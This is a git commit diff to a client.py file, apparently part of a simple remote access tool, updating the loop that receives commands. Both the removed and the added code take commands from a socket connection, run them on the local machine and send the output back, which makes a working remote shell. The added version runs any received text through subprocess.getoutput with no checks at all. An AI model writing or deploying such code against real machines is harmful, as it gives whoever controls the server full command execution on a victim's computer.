6ad74c70b57d7f2bbba8a29bdb5a5aa78bfd07a0
nebstarmalala <nebstartrizzle@gmail.com>
2020-09-08 21:22:37 +0300

    update recv command func

--- client.py
+++ client.py
@@ -33,15 +33,12 @@ def sys_info():
 sys_info()
 
 while True:
-    data = client.recv(2048)
-    if data[:2].decode("utf-8") == 'cd':
-        os.chdir(data[3:].decode("utf-8"))
-    if len(data) > 0:
-        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        output_bytes = cmd.stdout.read() + cmd.stderr.read()
-        output_str = str(output_bytes, "utf-8")
-        client.send(str.encode(output_str + str(os.getcwd()) + '> '))
-        print(output_str)
+    command = client.recv(20480).decode()
+    if command.lower() == 'exit':
+        break
+    
+    output = subprocess.getoutput(command)
+    client.send(output.encode())
 
 
 client.close()
